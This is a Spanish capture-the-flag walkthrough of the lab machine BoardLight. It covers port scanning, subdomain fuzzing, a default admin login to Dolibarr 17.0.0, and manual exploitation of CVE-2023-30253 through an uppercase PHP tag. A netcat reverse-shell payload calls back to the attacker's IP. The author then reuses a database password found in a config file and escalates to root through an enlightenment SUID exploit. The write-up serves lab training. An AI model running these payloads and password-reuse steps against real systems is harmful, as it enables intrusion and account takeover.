
Lanzamos un: 
```
└─$ nmap -sSCV -p- --open --min-rate 2500 -Pn -n -vvv 10.10.11.11
```

Con salida:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Accedemos al servidor con un *http:\//10.10.11.11* y observamos en el apartado de "contactos" un correo electrónico: *info\board.htb*. El pie de página también indica *"© 2020 All Rights Reserved By Board.htb"*.

Añado al /etc/hosts dicha línea para acceder a la máquina:
```
┌──(polika4r㉿prm)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       prm
10.10.11.11     board.htb
```

Y al acceder a *http://board.htb* me envía a una página idéntica a la que tenía antes.
Vamos a intentar buscar virtual hosts haciendo fuzzing:

```
wfuzz -c --hl=517 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.board.htb" http://board.htb/
```
-c: salida en color
-t: hilos simultáneos


Obviamos las respuestas con un tamaño de 15949 bytes (son las erróneas) y encontramos el VHOST llamado *crm.board.htb*.

Lo volvemos a añadir a */etc/hosts* con:
```
echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
```

Y al entrar en *http://crm.board.htb* veo un panel de Login.

Me loggeo en el panel con la contraseña admin:admin.

Dolibarr 17.0.0 es un software Open Source con funcionalidades avanzadas, que abarca tanto áreas de los ERP como de los CRM.

Buscamos en google:
```
dolibarr 17.0.0 vulnerability github
```

Y encontramos el CVE asociado **CVE-2023-30253**.
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

La POC nos muestra un ejecutable en Python.

Vamos a probar la versión automatizada del script descargado:
```
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
```

El README nos indica que tenemos que ejecutar:

```
python3 exploit.py <TARGET_HOSTNAME> <USERNAME> <PASSWORD> <LHOST> <LPORT>
```

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.9 443
```

Nos ponemos en escucha por el puerto 443 y recibimos la reverse-shell siendo www-data.
```
┌──(polika4r㉿prm)-[~]
└─$ sudo nc -nlvp 443              
[sudo] contraseña para polika4r: 
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.11] 38932
bash: cannot set terminal process group (853): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 

```

**Pero vamos a explotar esta vulnerabilidad manualmente, para entender que está pasando.**

----

Revisando el archivo exploit.py vemos que lo que hace es:
1. Crear un website
2. Crear una página web
3. Editar el código fuente de esa página web.

Vamos a crear, inventándonos todos los campos, un sitio web y un página.
Creamos un website con todos los campos inventados.
Creamos una Page usando la opción " Or create page from scratch or from a page template...". y editamos, con el botón "Edit HTML Source" esa página web.

Al añadir al código:

```
<!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable="true" if you want to use the inline editor for the content  -->
<section id="mysection1" contenteditable="true">
    <?php echo system("whoami");?>
</section>
```

El *\<?php echo system("\<comando>");?>* lo deniega porque sino podríamos inyectar código malicioso así.


Pues leyendo el script de python con calma y buscando por google, vemos como ese CVE se aprovecha de escribir *\<?PHP* en mayúsculas:

Haciendo un:
![[Pasted image 20250808143931.png]]

Si guardamos y consultamos la página creada mediante el botón de los prismáticos, veo como la web responde al comando de *whoami*:

![[Pasted image 20250808144209.png]]

Vamos a crear una reverse shell ahí.

Nos pondremos en escucha de nuevo por el puerto 9000:

```
nc -nlvp 9000
```

y en el código editor HTML e insertaremos una reverse shell:

```
    <?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9000 >/tmp/f");?>
```

```
<!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable="true" if you want to use the inline editor for the content  -->
<section id="mysection1" contenteditable="true">
    <?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9000 >/tmp/f");?>
</section>
```

Obteniendo por netcat un shell en dicho puerto.

Acondicionamos la terminal con:
- script /dev/null -c bash
- Ctrl + Z
- stty raw -echo; fg
- export TERM=xterm
- export SHELL=bash


Haciendo un *"whoami"*, veo que soy el usuario www-data.
Hago un:
```
cd /home
```

Y veo que existe el usuario "larissa" (directorio el cual contendrá el "user.xt").

Cuando me dan la terminal, aparezco en la ruta:
```
/var/www/html/crm.board.htb/htdocs/public/website
```

Voy a retroceder unas cuantas carpetas y buscaré contraseñas en texto claro en archivos, con el comando:

Desde el directorio
```
www-data@boardlight:~/html/crm.board.htb$ 
```

Ejecuto:
```
www-data@boardlight:~/html/crm.board.htb$ find . -name \*conf\* 2>/dev/null
```
Para buscar archivos que llamados "conf" o similar a los que el usuario www-data tenga permiso (las denegaciones de permiso las envío al dev/null).

Y entre otros archivos, encuentro este sospechoso:

```
./htdocs/conf/conf.php.example
./htdocs/conf/conf.php            <-------------------
./htdocs/modulebuilder/template/build/makepack-mymodule.conf
```

Lo abro y observo estas credenciales:

``` 
www-data@boardlight:~/html/crm.board.htb$ cat ./htdocs/conf/conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';              <-------------------------
$dolibarr_main_db_pass='serverfun2$2023!!';          <-------------------------
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
...
```



Tengo un usuario llamado **dolibarrowner** con contraseña **serverfun2$2023!!**.
Pruebo a ver si han utilizado esa misma contraseña para el usuario *larissa* y sí,
```
su dolibarrowner
	# contrseña serverfun2$2023!!
```

Para escalar privilegios, vamos a intentar un sudo -l:
```
sudo -l
```

Pero no podemos ejecutar nada.

Vamos a buscar por permisos SUID disponibles para *larissa* cuyo propietario sea *root*:
```
larissa@boardlight:~$ find / -perm -4000 -user root 2>/dev/null
```

Obtenemos esta respuesta:
```
larissa@boardlight:~$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys                   <------------------
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd              <------------------
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight             <------------------
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

Entre otros, existe extrañamente los archivos *"enlightenment"*. Que es un comando.

Probando, veo que es la versión 0.23.1 (he probado a escribir -v, --version, ....):
```
larissa@boardlight:~$ enlightenment --version
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00005 [0.00004] - Signal Trap
ESTART: 0.00006 [0.00001] - Signal Trap Done
ESTART: 0.00008 [0.00002] - Eina Init
ESTART: 0.00042 [0.00034] - Eina Init Done
ESTART: 0.00044 [0.00002] - Determine Prefix
ESTART: 0.00066 [0.00022] - Determine Prefix Done
ESTART: 0.00068 [0.00002] - Environment Variables
ESTART: 0.00069 [0.00001] - Environment Variables Done
ESTART: 0.00069 [0.00000] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

Realizo un:
```
searchexploit enlightenment
```
 Y veo como es vulnerable a anteriores a las versiones 0.25.3 (https://www.exploit-db.com/exploits/51180).

Utilizo este post de GitHub: (https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) el cual automatiza la explotación.

Con el usuario "larissa" me voy a /tmp y ejecuto el exploit.sh y adquiero privilegios de administrador.



